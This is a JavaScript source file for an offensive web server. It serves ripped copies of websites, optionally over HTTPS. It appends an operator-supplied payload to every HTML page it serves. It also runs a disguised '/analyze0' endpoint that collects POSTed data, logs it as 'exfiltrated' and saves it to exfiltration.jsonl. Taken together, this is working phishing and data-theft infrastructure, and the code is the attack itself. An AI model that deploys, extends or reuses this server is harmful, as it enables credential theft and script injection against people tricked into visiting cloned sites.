import * as http from "http";
import * as https from "https";
import fs from 'fs/promises';
import {performance} from 'perf_hooks';

import {Logger} from "./../util/logger.js";
import {Ansi} from "./../util/ansi.js";

let inject_string = false;
const files = {};
const EXFIL_LOG = 'exfiltration.jsonl';
const EXFIL_PATH = '/analyze0';

/**
 * Serves a ripped site from the browser/ripped folder or an arbitrary folder.
 * @param host the interface to bind to.
 * @param port the port to listen to.
 * @param resources the directory to serve.
 * @param inject payload buffer for injection.
 * @param tls use https for the server.
 * @returns {Promise<void>}
 */
export async function serve(host, port, resources, inject, tls) {
    resources = handle_resources_args(resources);
    inject_string = inject;
    Logger.info(`https is ${tls ? Ansi.green("enabled") : Ansi.red("disabled")}..`);
    Logger.info(`payload inject ${(inject) ? Ansi.green("enabled") : Ansi.red('disabled')}.`);
    Logger.info(`loading files from '${Ansi.cyan(resources)}' into ${Ansi.red('memory')}..`);
    await load_files_into_memory(resources);
    await start_server(host, port, tls);
}

async function start_server(host, port, tls) {
    let callback = () => Logger.info(`${Ansi.green('server')} listening on ${Ansi.cyan(host)} port ${Ansi.cyan(port)}.`);
    if (tls) {
        https.createServer({
            key: await fs.readFile('browser/keys/umo.key'),
            cert: await fs.readFile('browser/keys/umo.crt')
        },listener).listen(port, host, callback);
    } else {
        http.createServer(listener).listen(port, host, callback);
    }
}

async function load_files_into_memory(resources) {
    // load dirtree into memory for performance and security.
    for await (let entry of walkdir(resources)) {
        let webpath = entry.path.replace(resources, '/');
        files[webpath.toLowerCase()] = {data: await fs.readFile(entry.path), path: entry.path};

        if (webpath.endsWith('favicon.ico')) {
            let alias = webpath.replace('favicon.ico', 'favicon-128.png');
            files[alias] = files[webpath];
        }

        if (webpath.endsWith('index.html')) {
            let alias = webpath.replace(/(?<=.+?)\/?(index.html)/gi, '');
            files[alias] = files[webpath];
        }
        Logger.info(`\t${Ansi.cyan(webpath.slice(-64))}`);
    }
}

function handle_resources_args(resources) {
    if (!resources.includes('/')) {
        resources = `browser/ripped/${resources}`;
    }
    if (!resources.endsWith('/')) {
        resources += '/';
    }
    return resources;
}

function sniff(path) {
    if (path.endsWith('.svg')) return "image/svg+xml";
    if (path.endsWith('.png')) return "image/png";
    if (path.endsWith('.html')) return "text/html";
    if (path.endsWith('.css')) return "text/css";
    return '';
}

const listener = async (req, res) => {
    let start = performance.now();
    let url = req.url.split('?')[0].toLowerCase();
    let callback = () => access(req, res, url, (performance.now() - start).toFixed(1));

    if (url.length > 1) {
        // policy: drop trailing slashes to treat endpoints as files not directories.
        url = url.replace(/\/$/, '');
    }

    if (url === EXFIL_PATH) {
        handle_exfiltration(req, res, callback);
    } else if (files[url]) {
        respond(res, files[url].data, sniff(files[url].path), callback)
    } else {
        missing(res, callback);
    }
};

function handle_exfiltration(req, res, callback) {
    let body = [];
    req.on('data', (chunk) => body.push(chunk))
    req.on('end', async () => {
        body.push(Buffer.from('\n', 'utf-8'));
        body = Buffer.concat(body);

        respond(res, null, 'application/json', callback);
        Logger.info(`exfiltrated ${body.toString()}`)
        await fs.appendFile(EXFIL_LOG, body, 'utf8');
    })
}

function respond(res, data, type, callback) {
    let modified = new Date();
    modified.setSeconds(modified.getSeconds() - process.uptime());
    let expires = new Date();
    expires.setSeconds(expires.getSeconds() + (3600 * 4));
    res.writeHead(200, {
        "Content-Type": type,
        "Cache-Control": (type === 'text/html') ? "no-cache, must-revalidate" : "public, max-age=1800, immutable",
        "expires": expires.toUTCString(),
        "modified": modified.toUTCString()
    });
    res.write(data);
    handle_injection(type, res);
    res.end(callback);
}

function handle_injection(type, res) {
    if (inject_string && type === 'text/html') {
        // todo: replace env/request variables in the inject string.
        res.write(inject_string);
    }
}

function missing(res, callback) {
    let missing = '/404/index.html';
    res.writeHead(404);
    if (files[missing]) {
        res.end(files[missing].data, callback)
    } else {
        res.end('page not found.', callback);
    }
}

function access(req, res, url, time) {
    Logger.info(`${Ansi.red(req.method)} ${Ansi.yellow(res.statusCode)} [${Ansi.red(time + 'ms')}] - ${Ansi.cyan(url.slice(-48))} - ${req.headers['user-agent']?.substring(0, 32)}..`);
}

async function* walkdir(path = './') {
    const list = await fs.readdir(path, {withFileTypes: true});

    for (let item of list) {
        if (item.isDirectory()) {
            yield* walkdir(`${path}${item.name}/`)
        } else {
            yield {...item, path: `${path}${item.name}`}
        }
    }
}